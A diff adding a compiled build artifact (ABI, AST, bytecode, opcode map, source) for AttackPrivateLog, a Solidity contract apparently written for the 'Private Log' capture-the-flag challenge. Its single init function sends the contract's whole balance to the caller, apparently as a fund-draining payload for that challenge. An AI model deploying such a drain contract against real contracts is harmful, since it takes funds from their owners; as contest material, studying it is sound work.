@@ -1,0 +1,1197 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "bytes32",
+          "name": "_secretHash",
+          "type": "bytes32"
+        }
+      ],
+      "name": "init",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "15": "contracts/PrivateLog/AttackPrivateLog.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/PrivateLog/AttackPrivateLog.sol",
+    "exportedSymbols": {
+      "AttackPrivateLog": [
+        257
+      ]
+    },
+    "id": 258,
+    "license": "MIT",
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 232,
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".0"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "33:23:15"
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "AttackPrivateLog",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": {
+          "id": 233,
+          "nodeType": "StructuredDocumentation",
+          "src": "58:69:15",
+          "text": " @title Private Log\n @author Blue Alder (https://duc.tf)*"
+        },
+        "fullyImplemented": true,
+        "id": 257,
+        "linearizedBaseContracts": [
+          257
+        ],
+        "name": "AttackPrivateLog",
+        "nameLocation": "138:16:15",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "body": {
+              "id": 255,
+              "nodeType": "Block",
+              "src": "213:95:15",
+              "statements": [
+                {
+                  "assignments": [
+                    239
+                  ],
+                  "declarations": [
+                    {
+                      "constant": false,
+                      "id": 239,
+                      "mutability": "mutable",
+                      "name": "bal",
+                      "nameLocation": "231:3:15",
+                      "nodeType": "VariableDeclaration",
+                      "scope": 255,
+                      "src": "223:11:15",
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      },
+                      "typeName": {
+                        "id": 238,
+                        "name": "uint256",
+                        "nodeType": "ElementaryTypeName",
+                        "src": "223:7:15",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      },
+                      "visibility": "internal"
+                    }
+                  ],
+                  "id": 245,
+                  "initialValue": {
+                    "expression": {
+                      "arguments": [
+                        {
+                          "id": 242,
+                          "name": "this",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": -28,
+                          "src": "245:4:15",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_AttackPrivateLog_$257",
+                            "typeString": "contract AttackPrivateLog"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_contract$_AttackPrivateLog_$257",
+                            "typeString": "contract AttackPrivateLog"
+                          }
+                        ],
+                        "id": 241,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "237:7:15",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_address_$",
+                          "typeString": "type(address)"
+                        },
+                        "typeName": {
+                          "id": 240,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "237:7:15",
+                          "typeDescriptions": {}
+                        }
+                      },
+                      "id": 243,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "237:13:15",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "id": 244,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "balance",
+                    "nodeType": "MemberAccess",
+                    "src": "237:21:15",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "nodeType": "VariableDeclarationStatement",
+                  "src": "223:35:15"
+                },
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "id": 252,
+                        "name": "bal",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 239,
+                        "src": "297:3:15",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      ],
+                      "expression": {
+                        "arguments": [
+                          {
+                            "expression": {
+                              "id": 248,
+                              "name": "msg",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": -15,
+                              "src": "276:3:15",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_magic_message",
+                                "typeString": "msg"
+                              }
+                            },
+                            "id": 249,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "sender",
+                            "nodeType": "MemberAccess",
+                            "src": "276:10:15",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          ],
+                          "id": 247,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "268:8:15",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_payable_$",
+                            "typeString": "type(address payable)"
+                          },
+                          "typeName": {
+                            "id": 246,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "268:8:15",
+                            "stateMutability": "payable",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 250,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "268:19:15",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      },
+                      "id": 251,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "transfer",
+                      "nodeType": "MemberAccess",
+                      "src": "268:28:15",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
+                        "typeString": "function (uint256)"
+                      }
+                    },
+                    "id": 253,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "268:33:15",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 254,
+                  "nodeType": "ExpressionStatement",
+                  "src": "268:33:15"
+                }
+              ]
+            },
+            "functionSelector": "3b663195",
+            "id": 256,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "init",
+            "nameLocation": "171:4:15",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 236,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 235,
+                  "mutability": "mutable",
+                  "name": "_secretHash",
+                  "nameLocation": "184:11:15",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 256,
+                  "src": "176:19:15",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_bytes32",
+                    "typeString": "bytes32"
+                  },
+                  "typeName": {
+                    "id": 234,
+                    "name": "bytes32",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "176:7:15",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bytes32",
+                      "typeString": "bytes32"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "175:21:15"
+            },
+            "returnParameters": {
+              "id": 237,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "213:0:15"
+            },
+            "scope": 257,
+            "src": "162:146:15",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          }
+        ],
+        "scope": 258,
+        "src": "129:182:15",
+        "usedErrors": []
+      }
+    ],
+    "src": "33:278:15"
+  },
+  "bytecode": "608060405234801561001057600080fd5b5060b38061001f6000396000f3fe608060405260043610601c5760003560e01c80633b663195146021575b600080fd5b6030602c3660046065565b6032565b005b6040514790339082156108fc029083906000818181858888f193505050501580156060573d6000803e3d6000fd5b505050565b600060208284031215607657600080fd5b503591905056fea264697066735822122023aa8665eec479c61903c4d07df57eaa47f4dfed0e11bac81e6a6b2c9066dafc64736f6c634300080b0033",
+  "bytecodeSha1": "0d585b4094ea077aa8d6ddfe29a2a04d64e80347",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.8.11+commit.d7f03943"
+  },
+  "contractName": "AttackPrivateLog",
+  "coverageMap": {
+    "branches": {
+      "15": {}
+    },
+    "statements": {
+      "15": {
+        "AttackPrivateLog.init": {
+          "0": [
+            268,
+            301
+          ]
+        }
+      }
+    }
+  },
+  "dependencies": [],
+  "deployedBytecode": "608060405260043610601c5760003560e01c80633b663195146021575b600080fd5b6030602c3660046065565b6032565b005b6040514790339082156108fc029083906000818181858888f193505050501580156060573d6000803e3d6000fd5b505050565b600060208284031215607657600080fd5b503591905056fea264697066735822122023aa8665eec479c61903c4d07df57eaa47f4dfed0e11bac81e6a6b2c9066dafc64736f6c634300080b0033",
+  "deployedSourceMap": "129:182:15:-:0;;;;;;;;;;;;;;;;;;;;;162:146;;;;;;:::i;:::-;;:::i;:::-;;;268:33;;237:21;;276:10;;268:33;;;;;237:21;;223:11;268:33;223:11;268:33;237:21;276:10;268:33;;;;;;;;;;;;;;;;;;;;;213:95;162:146;:::o;14:180:20:-;73:6;126:2;114:9;105:7;101:23;97:32;94:52;;;142:1;139;132:12;94:52;-1:-1:-1;165:23:20;;14:180;-1:-1:-1;14:180:20:o",
+  "language": "Solidity",
+  "natspec": {
+    "author": "Blue Alder (https://duc.tf)*",
+    "kind": "dev",
+    "methods": {},
+    "title": "Private Log",
+    "version": 1
+  },
+  "offset": [
+    129,
+    311
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3B663195 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x30 PUSH1 0x2C CALLDATASIZE PUSH1 0x4 PUSH1 0x65 JUMP JUMPDEST PUSH1 0x32 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x40 MLOAD SELFBALANCE SWAP1 CALLER SWAP1 DUP3 ISZERO PUSH2 0x8FC MUL SWAP1 DUP4 SWAP1 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH1 0x60 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH1 0x76 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x23 0xAA DUP7 PUSH6 0xEEC479C61903 0xC4 0xD0 PUSH30 0xF57EAA47F4DFED0E11BAC81E6A6B2C9066DAFC64736F6C634300080B0033 ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "MSTORE",
+      "path": "15"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x4"
+    },
+    "7": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "CALLDATASIZE",
+      "path": "15"
+    },
+    "8": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "LT",
+      "path": "15"
+    },
+    "9": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x1C"
+    },
+    "11": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "JUMPI",
+      "path": "15"
+    },
+    "12": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x0"
+    },
+    "14": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "CALLDATALOAD",
+      "path": "15"
+    },
+    "15": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0xE0"
+    },
+    "17": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "SHR",
+      "path": "15"
+    },
+    "18": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "DUP1",
+      "path": "15"
+    },
+    "19": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH4",
+      "path": "15",
+      "value": "0x3B663195"
+    },
+    "24": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "EQ",
+      "path": "15"
+    },
+    "25": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x21"
+    },
+    "27": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "JUMPI",
+      "path": "15"
+    },
+    "28": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "JUMPDEST",
+      "path": "15"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x0"
+    },
+    "31": {
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "DUP1",
+      "path": "15"
+    },
+    "32": {
+      "first_revert": true,
+      "fn": null,
+      "offset": [
+        129,
+        311
+      ],
+      "op": "REVERT",
+      "path": "15"
+    },
+    "33": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMPDEST",
+      "path": "15"
+    },
+    "34": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x30"
+    },
+    "36": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x2C"
+    },
+    "38": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "CALLDATASIZE",
+      "path": "15"
+    },
+    "39": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x4"
+    },
+    "41": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x65"
+    },
+    "43": {
+      "fn": "AttackPrivateLog.init",
+      "jump": "i",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMP",
+      "path": "15"
+    },
+    "44": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMPDEST",
+      "path": "15"
+    },
+    "45": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x32"
+    },
+    "47": {
+      "fn": "AttackPrivateLog.init",
+      "jump": "i",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMP",
+      "path": "15"
+    },
+    "48": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMPDEST",
+      "path": "15"
+    },
+    "49": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "STOP",
+      "path": "15"
+    },
+    "50": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMPDEST",
+      "path": "15"
+    },
+    "51": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "statement": 0,
+      "value": "0x40"
+    },
+    "53": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "MLOAD",
+      "path": "15"
+    },
+    "54": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        237,
+        258
+      ],
+      "op": "SELFBALANCE",
+      "path": "15"
+    },
+    "55": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        237,
+        258
+      ],
+      "op": "SWAP1",
+      "path": "15"
+    },
+    "56": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        276,
+        286
+      ],
+      "op": "CALLER",
+      "path": "15"
+    },
+    "57": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        276,
+        286
+      ],
+      "op": "SWAP1",
+      "path": "15"
+    },
+    "58": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "DUP3",
+      "path": "15"
+    },
+    "59": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "ISZERO",
+      "path": "15"
+    },
+    "60": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "PUSH2",
+      "path": "15",
+      "value": "0x8FC"
+    },
+    "63": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "MUL",
+      "path": "15"
+    },
+    "64": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "SWAP1",
+      "path": "15"
+    },
+    "65": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        237,
+        258
+      ],
+      "op": "DUP4",
+      "path": "15"
+    },
+    "66": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        237,
+        258
+      ],
+      "op": "SWAP1",
+      "path": "15"
+    },
+    "67": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        223,
+        234
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x0"
+    },
+    "69": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "DUP2",
+      "path": "15"
+    },
+    "70": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        223,
+        234
+      ],
+      "op": "DUP2",
+      "path": "15"
+    },
+    "71": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "DUP2",
+      "path": "15"
+    },
+    "72": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        237,
+        258
+      ],
+      "op": "DUP6",
+      "path": "15"
+    },
+    "73": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        276,
+        286
+      ],
+      "op": "DUP9",
+      "path": "15"
+    },
+    "74": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "DUP9",
+      "path": "15"
+    },
+    "75": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "CALL",
+      "path": "15"
+    },
+    "76": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "SWAP4",
+      "path": "15"
+    },
+    "77": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "78": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "79": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "80": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "81": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "ISZERO",
+      "path": "15"
+    },
+    "82": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "DUP1",
+      "path": "15"
+    },
+    "83": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "ISZERO",
+      "path": "15"
+    },
+    "84": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x60"
+    },
+    "86": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "JUMPI",
+      "path": "15"
+    },
+    "87": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "15"
+    },
+    "88": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x0"
+    },
+    "90": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "DUP1",
+      "path": "15"
+    },
+    "91": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "RETURNDATACOPY",
+      "path": "15"
+    },
+    "92": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "15"
+    },
+    "93": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "PUSH1",
+      "path": "15",
+      "value": "0x0"
+    },
+    "95": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "REVERT",
+      "path": "15"
+    },
+    "96": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "JUMPDEST",
+      "path": "15"
+    },
+    "97": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        268,
+        301
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "98": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        213,
+        308
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "99": {
+      "fn": "AttackPrivateLog.init",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "POP",
+      "path": "15"
+    },
+    "100": {
+      "fn": "AttackPrivateLog.init",
+      "jump": "o",
+      "offset": [
+        162,
+        308
+      ],
+      "op": "JUMP",
+      "path": "15"
+    },
+    "101": {
+      "op": "JUMPDEST"
+    },
+    "102": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "104": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "106": {
+      "op": "DUP3"
+    },
+    "107": {
+      "op": "DUP5"
+    },
+    "108": {
+      "op": "SUB"
+    },
+    "109": {
+      "op": "SLT"
+    },
+    "110": {
+      "op": "ISZERO"
+    },
+    "111": {
+      "op": "PUSH1",
+      "value": "0x76"
+    },
+    "113": {
+      "op": "JUMPI"
+    },
+    "114": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "116": {
+      "op": "DUP1"
+    },
+    "117": {
+      "op": "REVERT"
+    },
+    "118": {
+      "op": "JUMPDEST"
+    },
+    "119": {
+      "op": "POP"
+    },
+    "120": {
+      "op": "CALLDATALOAD"
+    },
+    "121": {
+      "op": "SWAP2"
+    },
+    "122": {
+      "op": "SWAP1"
+    },
+    "123": {
+      "op": "POP"
+    },
+    "124": {
+      "jump": "o",
+      "op": "JUMP"
+    }
+  },
+  "sha1": "ccf3c1e266d92c20e8871e3d4b30c5588cb9157e",
+  "source": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @title Private Log\n * @author Blue Alder (https://duc.tf)\n **/\n\ncontract AttackPrivateLog {\n\n    function init(bytes32 _secretHash) payable public  {\n        uint256 bal = address(this).balance;\n        payable(msg.sender).transfer(bal);\n    }\n\n}",
+  "sourceMap": "129:182:15:-:0;;;;;;;;;;;;;;;;;;;",
+  "sourcePath": "contracts/PrivateLog/AttackPrivateLog.sol",
+  "type": "contract"
+}
